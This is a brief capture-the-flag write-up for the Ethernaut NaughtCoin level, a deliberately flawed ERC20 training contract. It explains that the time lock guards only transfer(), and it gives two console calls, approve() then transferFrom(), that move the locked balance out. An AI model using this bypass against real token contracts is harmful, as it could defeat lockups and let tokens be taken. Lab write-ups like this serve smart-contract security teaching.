# Level 14: [Naught coin](https://ethernaut.openzeppelin.com/level/0x36E92B2751F260D6a4749d7CA58247E7f8198284)

## Level objectives:
NaughtCoin is an ERC20 token and you're already holding all of them. The catch is that you'll only be able to transfer them after a 10 year lockout period. Can you figure out how to get them out to another address so that you can transfer them freely? Complete this level by getting your token balance to 0.

## Analysis (lol)
- The lockout period modifier is applied only on the `transfer()` function.
- We use ERC20's allowance mechanism to transact.

## Steps:
```js
contract.approve("0x599C5A4be2b87F0128b87Fea208DBE5AE41095e4", "1000000000000000000000000");

contract.transferFrom(
  "0x599C5A4be2b87F0128b87Fea208DBE5AE41095e4",
  "0x33cc45d8B0336bFA830FB512b54b02a049277403",
  "1000000000000000000000000"
);
```